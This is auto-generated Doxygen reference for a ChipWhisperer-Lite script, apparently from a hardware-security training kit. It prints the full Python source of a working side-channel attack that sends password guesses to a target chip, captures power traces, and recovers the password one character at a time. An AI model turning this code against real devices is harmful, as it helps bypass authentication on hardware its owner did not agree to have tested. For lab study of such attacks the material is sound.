\hypertarget{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript}{}\section{software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.User\+Script Class Reference}
\label{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript}\index{software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.\+User\+Script@{software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.\+User\+Script}}
\subsection*{Public Member Functions}
\begin{DoxyCompactItemize}
\item 
def \hyperlink{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_a7ed994f9ae9ff324eb313e3e35fd6a1f}{\+\_\+\+\_\+init\+\_\+\+\_\+} (self, \hyperlink{namespacesoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_a452abda888c34b0cc5d5684b00602f9e}{api})
\item 
def \hyperlink{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_aa16c2b2a310537131e46e494a5063716}{run} (self)
\end{DoxyCompactItemize}


Inheritance diagram for software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.User\+Script\+:\nopagebreak
\begin{figure}[H]
\begin{center}
\leavevmode
\includegraphics[width=293pt]{d2/d2c/classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript__inherit__graph}
\end{center}
\end{figure}


Collaboration diagram for software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.User\+Script\+:\nopagebreak
\begin{figure}[H]
\begin{center}
\leavevmode
\includegraphics[width=293pt]{dd/d3b/classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript__coll__graph}
\end{center}
\end{figure}


\subsection{Constructor \& Destructor Documentation}
\hypertarget{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_a7ed994f9ae9ff324eb313e3e35fd6a1f}{}\index{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script@{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script}!\+\_\+\+\_\+init\+\_\+\+\_\+@{\+\_\+\+\_\+init\+\_\+\+\_\+}}
\index{\+\_\+\+\_\+init\+\_\+\+\_\+@{\+\_\+\+\_\+init\+\_\+\+\_\+}!software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script@{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script}}
\subsubsection[{\+\_\+\+\_\+init\+\_\+\+\_\+}]{\setlength{\rightskip}{0pt plus 5cm}def software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.\+User\+Script.\+\_\+\+\_\+init\+\_\+\+\_\+ (
\begin{DoxyParamCaption}
\item[{}]{self, }
\item[{}]{api}
\end{DoxyParamCaption}
)}\label{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_a7ed994f9ae9ff324eb313e3e35fd6a1f}

\begin{DoxyCode}
47     \textcolor{keyword}{def }\hyperlink{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_a7ed994f9ae9ff324eb313e3e35fd6a1f}{\_\_init\_\_}(self, api):
48         super(UserScript, self).\hyperlink{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_a7ed994f9ae9ff324eb313e3e35fd6a1f}{\_\_init\_\_}(api)
49 
\end{DoxyCode}


\subsection{Member Function Documentation}
\hypertarget{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_aa16c2b2a310537131e46e494a5063716}{}\index{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script@{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script}!run@{run}}
\index{run@{run}!software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script@{software\+::chipwhisperer\+::capture\+::scripts\+::cwlite-\/timingattack\+::\+User\+Script}}
\subsubsection[{run}]{\setlength{\rightskip}{0pt plus 5cm}def software.\+chipwhisperer.\+capture.\+scripts.\+cwlite-\/timingattack.\+User\+Script.\+run (
\begin{DoxyParamCaption}
\item[{}]{self}
\end{DoxyParamCaption}
)}\label{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_aa16c2b2a310537131e46e494a5063716}
\begin{DoxyVerb}Set up the CWLite to record power traces while attempting passwords
and perform a timing attack to recover the password.

Called when the script is run (from command line or from CW-Capture)
\end{DoxyVerb}
 
\begin{DoxyCode}
50     \textcolor{keyword}{def }\hyperlink{classsoftware_1_1chipwhisperer_1_1capture_1_1scripts_1_1cwlite-timingattack_1_1UserScript_aa16c2b2a310537131e46e494a5063716}{run}(self):
51         \textcolor{stringliteral}{"""}
52 \textcolor{stringliteral}{        Set up the CWLite to record power traces while attempting passwords}
53 \textcolor{stringliteral}{        and perform a timing attack to recover the password.}
54 \textcolor{stringliteral}{        }
55 \textcolor{stringliteral}{        Called when the script is run (from command line or from CW-Capture)}
56 \textcolor{stringliteral}{        """}
57         
58         \textcolor{comment}{# First: set up the basics and connect to the CW-Lite}
59         self.api.setParameter([\textcolor{stringliteral}{'Generic Settings'}, \textcolor{stringliteral}{'Scope Module'}, \textcolor{stringliteral}{'ChipWhisperer/OpenADC'}])
60         self.api.setParameter([\textcolor{stringliteral}{'Generic Settings'}, \textcolor{stringliteral}{'Target Module'}, \textcolor{stringliteral}{'Simple Serial'}])
61         self.api.setParameter([\textcolor{stringliteral}{'Generic Settings'}, \textcolor{stringliteral}{'Trace Format'}, \textcolor{stringliteral}{'ChipWhisperer/Native'}])
62         self.api.setParameter([\textcolor{stringliteral}{'Simple Serial'}, \textcolor{stringliteral}{'Connection'}, \textcolor{stringliteral}{'ChipWhisperer-Lite'}])
63         self.api.setParameter([\textcolor{stringliteral}{'ChipWhisperer/OpenADC'}, \textcolor{stringliteral}{'Connection'}, \textcolor{stringliteral}{'ChipWhisperer-Lite'}])
64         self.api.connect()
65         
66         
67         \textcolor{comment}{# Next: set up everything we need to connect to the target}
68         \textcolor{comment}{# Put all of our commands in a list and execute them at the end}
69         lstexample = [
70                       \textcolor{comment}{# Gain}
71                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Gain Setting'}, \textcolor{stringliteral}{'Setting'}, 45],
72                       \textcolor{comment}{# Trigger}
73                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Trigger Setup'}, \textcolor{stringliteral}{'Mode'}, \textcolor{stringliteral}{'rising edge'}],
74                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Trigger Setup'}, \textcolor{stringliteral}{'Offset'}, 0],
75                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Trigger Setup'}, \textcolor{stringliteral}{'Total Samples'}, 2000],
76                       \textcolor{comment}{# Clock}
77                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Clock Setup'}, \textcolor{stringliteral}{'CLKGEN Settings'}, \textcolor{stringliteral}{'Desired Frequency'}, 7370000.0],
78                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Clock Setup'}, \textcolor{stringliteral}{'ADC Clock'}, \textcolor{stringliteral}{'Source'}, \textcolor{stringliteral}{'CLKGEN x4 via DCM'}],
79                       [\textcolor{stringliteral}{'OpenADC'}, \textcolor{stringliteral}{'Clock Setup'}, \textcolor{stringliteral}{'ADC Clock'}, \textcolor{stringliteral}{'Reset ADC DCM'}, \textcolor{keywordtype}{None}],
80                       \textcolor{comment}{# Pins}
81                       [\textcolor{stringliteral}{'CW Extra Settings'}, \textcolor{stringliteral}{'Trigger Pins'}, \textcolor{stringliteral}{'Target IO4 (Trigger Line)'}, \textcolor{keyword}{True}],
82                       [\textcolor{stringliteral}{'CW Extra Settings'}, \textcolor{stringliteral}{'Target HS IO-Out'}, \textcolor{stringliteral}{'CLKGEN'}],
83                       [\textcolor{stringliteral}{'CW Extra Settings'}, \textcolor{stringliteral}{'Target IOn Pins'}, \textcolor{stringliteral}{'Target IO1'}, \textcolor{stringliteral}{'Serial RXD'}],
84                       [\textcolor{stringliteral}{'CW Extra Settings'}, \textcolor{stringliteral}{'Target IOn Pins'}, \textcolor{stringliteral}{'Target IO2'}, \textcolor{stringliteral}{'Serial TXD'}],
85                       \textcolor{comment}{# Automatic commands}
86                       [\textcolor{stringliteral}{'Simple Serial'}, \textcolor{stringliteral}{'Load Key Command'}, \textcolor{stringliteral}{''}],
87                       [\textcolor{stringliteral}{'Simple Serial'}, \textcolor{stringliteral}{'Go Command'}, \textcolor{stringliteral}{'h0px3\(\backslash\)n'}],
88                       [\textcolor{stringliteral}{'Simple Serial'}, \textcolor{stringliteral}{'Output Format'}, \textcolor{stringliteral}{''}],
89                       \textcolor{comment}{# Auto-reset}
90                       [\textcolor{stringliteral}{'Generic Settings'}, \textcolor{stringliteral}{'Auxiliary Module'}, \textcolor{stringliteral}{'Reset AVR/XMEGA via CW-Lite'}],
91                       [\textcolor{stringliteral}{'Reset AVR/XMEGA via CW-Lite'}, \textcolor{stringliteral}{'Delay (Post-Arm)'}, 1200],
92                       ]
93         
94         \textcolor{comment}{#Download all hardware setup parameters}
95         \textcolor{keywordflow}{for} cmd \textcolor{keywordflow}{in} lstexample: 
96             self.api.setParameter(cmd)
97                        
98         \textcolor{comment}{# Get one capture for fun}
99         self.api.capture1()
100         data = self.api.getScope().datapoints
101         \textcolor{keywordflow}{print} data
102         
103         
104         \textcolor{comment}{# Crack the first letter}
105         password = \textcolor{stringliteral}{''}
106         trylist = \textcolor{stringliteral}{'abcdefghijklmnopqrstuvwxyz0123456789'}
107           
108         \textcolor{keywordflow}{for} i \textcolor{keywordflow}{in} range(5):
109             \textcolor{keywordflow}{for} c \textcolor{keywordflow}{in} trylist:
110                 \textcolor{comment}{# Get a power trace using our next attempt}
111                 nextPass = password + \textcolor{stringliteral}{'\{\}'}.format(c)
112                 self.api.setParameter([\textcolor{stringliteral}{'Simple Serial'}, \textcolor{stringliteral}{'Go Command'}, \textcolor{stringliteral}{'\{\}\(\backslash\)n'}.format(nextPass)])
113                 self.api.capture1()
114                 
115                 \textcolor{comment}{# Grab the trace}
116                 nextTrace = self.api.getScope().datapoints
117                 
118                 \textcolor{comment}{# Check location 153, 225, etc. If it's too low, we've failed}
119                 \textcolor{keywordflow}{if} nextTrace[153 + 72*i] < -0.2:
120                     \textcolor{keywordflow}{continue}
121                     
122                 \textcolor{comment}{# If we got here, we've found the right letter}
123                 password += c
124                 \textcolor{keywordflow}{print} \textcolor{stringliteral}{'\{\} characters: \{\}'}.format(i+1, password)
125                 \textcolor{keywordflow}{break}
126 
127 
\end{DoxyCode}


The documentation for this class was generated from the following file\+:\begin{DoxyCompactItemize}
\item 
\hyperlink{cwlite-timingattack_8py}{cwlite-\/timingattack.\+py}\end{DoxyCompactItemize}
